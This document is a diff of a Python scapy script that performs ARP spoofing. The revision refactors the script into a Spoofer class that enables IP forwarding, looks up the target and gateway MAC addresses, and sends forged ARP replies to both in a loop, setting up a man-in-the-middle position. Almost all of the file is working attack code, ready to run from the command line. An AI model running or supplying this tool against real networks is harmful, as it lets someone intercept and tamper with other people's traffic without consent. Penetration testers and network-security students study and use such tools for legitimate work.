@@ -1,78 +1,86 @@
 #!/usr/bin/python3
 
 from scapy.all import srp, send, Ether, ARP
-from time import sleep
 from pathlib import Path
+from time import sleep
 import argparse
 import sys
 
 
+class Spoofer:
+    def __init__(self, target_ip, gateway_ip, interface):
+        self.target_ip = target_ip
+        self.gateway_ip = gateway_ip
+        self.target_mac = get_mac(target_ip)
+        self.gateway_mac = get_mac(gateway_ip)
+        self.interface = interface
+        self.print_initialisation()
+    
+    def print_initialisation(self):
+        print(f"[*] Gateway {self.gateway_ip} is at {self.gateway_mac}")
+        print(f"[*] Target {self.target_ip} is at {self.target_mac}")
+    
+    def run(self):
+        spoof_target = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.target_mac)
+        spoof_gateway = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)
+        print(f"[*] Prepare to send to {self.target_ip}: {self.gateway_ip} is at {spoof_target.hwsrc}")
+        print(f"[*] Prepare to send to {self.gateway_ip}: {self.target_ip} is at {spoof_gateway.hwsrc}")
+        print("[+] Beginning ARP Spoofing. [CTRL+C to stop]")
+
+        try:
+            while True:
+                sys.stdout.write("*")
+                sys.stdout.flush()
+                send(spoof_target, verbose=False)
+                send(spoof_gateway, verbose=False)
+                sleep(2)
+        except KeyboardInterrupt:
+            print("\n\n[!] Detected CTRL+C ... Restoring ARP tables, please Wait.")    
+            self.restore()
+        finally:
+            sys.exit()
+
+    def restore(self):
+        restore_target = ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff")
+        restore_gateway = ARP(op=2, psrc=self.target_ip, hwsrc=self.target_mac, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
+        send(restore_target, count=4, verbose=False)
+        send(restore_gateway, count=4, verbose=False)
+
 def get_arguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument("target", action="store", type=str, help="Please specify target IP address")
-    parser.add_argument("gateway", action="store", type=str, help="Please specify default gateway IP address")
-    parser.add_argument("--verbose", action="store_true", default=True)
+    parser.add_argument("target", action="store", type=str, help="Please specify Target IP address")
+    parser.add_argument("gateway", action="store", type=str, help="Please specify default Gateway IP address")
+    parser.add_argument("interface", action="store", type=str, help="Please specify the Interface")
     return parser.parse_args()
 
 def enable_ip_forward():
     path = Path("/proc/sys/net/ipv4/ip_forward")
-    print("[+] Enabling IP forwarding.")
-    with open(path, "r+") as file:
-        if "1" in file.read():
-            print("[!] IP forwarding was already enabled.")
-        else:
-            file.seek(0)
-            file.write("1")
-            print("[+] IP forwarding enabled.")
+    print("[*] Enabling IP forwarding.")
+    try:
+        with open(path, "r+") as file:
+            if "1" in file.read():
+                print("[!] IP forwarding was already enabled.")
+            else:
+                file.seek(0)
+                file.write("1")
+                print("[+] IP forwarding enabled.")
+    except PermissionError:
+        print("[-] IP forwarding requires root privileges. QUITTING!")
+        sys.exit()
+
 
 def get_mac(ip):
-    broadcast_address = "ff:ff:ff:ff:ff:ff"
-    answerred, _ = srp(Ether(dst=broadcast_address)/ARP(pdst=ip), timeout=2, verbose=0)
-    if answerred:
-        return answerred[0][1].hwsrc
-
-
-def restore(target_ip, spoof_ip, verbose=True):
-    target_mac = get_mac(target_ip)
-    spoof_mac = get_mac(spoof_ip)
-    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac,
-                       psrc=spoof_ip, hwsrc=spoof_ip)
-    send(arp_response, count=6, verbose=0)
-    if verbose:
-        print(f"[+] Sent to {target_ip} : {spoof_ip} is at {spoof_mac}")
-
-
-
-def spoof(target_ip, spoof_ip, verbose=True):
-    target_mac = get_mac(target_ip)
-    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    send(arp_response, verbose=0)
-    if verbose:
-        print(f"[+] Sent to {target_ip} : {spoof_ip} is at {arp_response.hwsrc}")
+    answerred, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=8, verbose=False)
+    for _, r in answerred:
+        return r[Ether].src
 
 
 if __name__ == "__main__":
+    # ip route | grep default | head -1 | cut -d " " -f 3
     arguments = get_arguments()
     target_ip = arguments.target
     gateway_ip = arguments.gateway
-    verbose = arguments.verbose
-    
-    try:
-        enable_ip_forward()
-    except PermissionError:
-        print("[-] You requested IP forwarding which requires root privileges. QUITTING!")
-        sys.exit(0)
-
-    try:
-        while True:
-            spoof(target_ip, gateway_ip, verbose)
-            spoof(gateway_ip, target_ip, verbose)
-            sleep(1)
-    except PermissionError:
-        print("[-] You requested ARP creation which requires root privileges. QUITTING!")
-    except KeyboardInterrupt:
-        print("\n\n[-] Detected CTRL+C ... Resetting ARP tables ... Please Wait.")
-        restore(target_ip, gateway_ip)
-        restore(gateway_ip, target_ip)
-    finally:
-        sys.exit(0)
+    interface = arguments.interface
+    enable_ip_forward()
+    spoofer = Spoofer(target_ip=target_ip, gateway_ip=gateway_ip, interface=interface)
+    spoofer.run()
